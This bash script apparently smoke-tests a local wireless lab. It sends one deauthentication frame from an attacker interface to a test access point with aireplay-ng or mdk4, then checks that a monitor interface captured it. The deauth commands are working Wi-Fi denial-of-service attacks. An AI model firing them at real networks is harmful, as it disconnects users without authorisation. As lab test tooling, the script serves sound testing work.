#!/usr/bin/env bash
# Fire ONE deauth from wlan30 against wlan0, confirm wlan31 captured it.
set -euo pipefail
PCAP=/tmp/smoke.pcap

ATTACKER=wlan30
MONITOR=wlan31
TARGET_AP=wlan0

BSSID=$(cat "/sys/class/net/${TARGET_AP}/address")
echo "[*] Target AP ($TARGET_AP) BSSID: $BSSID"
echo "[*] Attacker: $ATTACKER, Monitor: $MONITOR"

echo "[*] Capturing on $MONITOR for 8s..."
sudo timeout 8 tcpdump -i "$MONITOR" -e -s0 -w "$PCAP" 'type mgt subtype deauth' 2>/dev/null &
CAP_PID=$!
sleep 2

echo "[*] Firing one deauth from $ATTACKER..."
sudo aireplay-ng --deauth 1 -a "$BSSID" --ignore-negative-one "$ATTACKER" || \
  sudo timeout 2 mdk4 "$ATTACKER" d -B "$BSSID" || true

wait $CAP_PID 2>/dev/null || true

N=$(sudo tcpdump -r "$PCAP" 2>/dev/null | grep -ci deauth || true)
echo
if [ "${N:-0}" -ge 1 ]; then
  echo "[PASS] captured $N deauth frame(s)."
else
  echo "[FAIL] no deauth captured. Check $ATTACKER and $MONITOR on channel 6 and clients associated."
fi
